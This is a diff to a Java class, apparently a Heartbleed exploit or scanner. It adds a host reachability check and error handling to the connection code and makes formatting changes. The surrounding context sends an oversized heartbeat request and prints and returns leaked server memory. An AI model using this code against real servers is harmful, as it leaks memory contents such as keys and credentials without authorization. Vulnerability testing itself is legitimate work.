@@ -8,6 +8,7 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.FileOutputStream;
 import java.io.UnsupportedEncodingException;
+import java.net.InetAddress;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -45,14 +46,36 @@ public class HeartBleed {
         0x00, 0x00, 0x00, 0x0f, 0x00, 0x01, 0x01
     };
 
-    public void connect(String server, int port) throws IOException {
-        if (port == 0) {
-            connection = new Socket(server, 443);//443 default ssl port
-        } else {
-            connection = new Socket(server, port);
+    public boolean connect(String server, int port) {
+        boolean isConn=false;
+        try {
+            InetAddress ipTargeAddress = InetAddress.getByName(server);
+            try {
+                if (ipTargeAddress.isReachable(1000)) {
+                    if (port == 0) {
+                        connection = new Socket(server, 443);//443 default ssl port
+                    } else {
+                        connection = new Socket(server, port);
+                    }
+                    inStr = connection.getInputStream();
+                    outStr = connection.getOutputStream();
+                    isConn=true;
+                }else{
+                    System.out.println("Destination Host Unreachable!");
+                    isConn=false;
+                }
+            }
+            catch (IOException ex) {
+                Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
+                isConn=false;
+            }
+            
         }
-        inStr = connection.getInputStream();
-        outStr = connection.getOutputStream();
+        catch (UnknownHostException ex) {
+            Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
+            isConn=false;
+        }
+        return isConn;
     }
 
     public void hello() throws IOException {
@@ -77,7 +100,7 @@ public class HeartBleed {
 
     //sends/receives the heartbeat
     public synchronized boolean heartBeat(String message) throws IOException {
-        boolean statusServer=false;
+        boolean statusServer = false;
         System.out.println("Sending Heartbeat...");
         outStr.write(makeHeartBeat(message, 4096));
         outStr.flush();
@@ -88,17 +111,17 @@ public class HeartBleed {
             if (finalMessage.type == 24) {
                 System.out.println("Heartbeat recieved!");
                 System.out.printf("Type: %d Version: %d Length: %d\n", finalMessage.type, finalMessage.version, finalMessage.length);
-                statusServer=true;
+                statusServer = true;
                 break;
             }
             if (finalMessage.type == 21) {
                 System.out.println("Error");
-                statusServer=false;
+                statusServer = false;
                 break;
             }
-            if (finalMessage.type == 0){
+            if (finalMessage.type == 0) {
                 System.out.println("No heartbeat response received, server likely not vulnerable");
-                statusServer=false;
+                statusServer = false;
                 break;
             }
         }
@@ -117,13 +140,15 @@ public class HeartBleed {
             String saida = new String(finalMessage.body, "UTF-8");
             String filtrado = saida.replaceAll("[^A-Za-z0-9()\\[\\]]", "");
             System.out.println(filtrado);
-        } catch (UnsupportedEncodingException ex) {
+        }
+        catch (UnsupportedEncodingException ex) {
             Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
         }
     }
 
     /**
      * Return the data string of memory server vulnerable
+     *
      * @return String Message of memory
      */
     public String getMemoryMessage() {
@@ -133,7 +158,8 @@ public class HeartBleed {
             outMessage = new String(finalMessage.body, "UTF-8");
             System.out.println(outMessage);
             outMessageFiltred = outMessage.replaceAll("[^(\\p{Alnum}|\\p{Punct})]+", "");
-        } catch (UnsupportedEncodingException ex) {
+        }
+        catch (UnsupportedEncodingException ex) {
             Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
         }
         return outMessageFiltred;
@@ -141,7 +167,8 @@ public class HeartBleed {
 
     /**
      * Constructs a heartbeat with custom message
-     * @param message String customized 
+     *
+     * @param message String customized
      * @param claimedLen the legend claimed
      * @return the hexabyte response
      */
@@ -153,7 +180,8 @@ public class HeartBleed {
 
         try {
             messageBytes = message.getBytes("UTF-8");
-        } catch (UnsupportedEncodingException e) {
+        }
+        catch (UnsupportedEncodingException e) {
 
             e.printStackTrace();
         }
